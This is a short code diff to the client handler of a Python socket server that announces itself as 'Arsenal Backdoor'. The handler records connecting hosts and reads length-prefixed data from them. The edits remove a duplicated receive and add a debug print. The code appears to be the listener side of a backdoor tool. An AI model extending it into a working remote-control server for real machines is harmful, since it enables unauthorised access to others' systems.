@@ -23,13 +23,12 @@ def client(conn, addr, buff):
         conn.send(b'Arsenal Backdoor\n')
         data = conn.recv(buff)
         print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
-        data = conn.recv(buff)
-        print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
         clients[addr[0]] = str(data.strip(), 'utf-8')
     print(clients)
     while True:
         holder = []
         length = conn.recv(buff)
+        print(length)
         while len(''.join(holder)) < int(length):
             data = conn.recv(buff)
             holder.append(str(data.strip(), 'utf-8'))
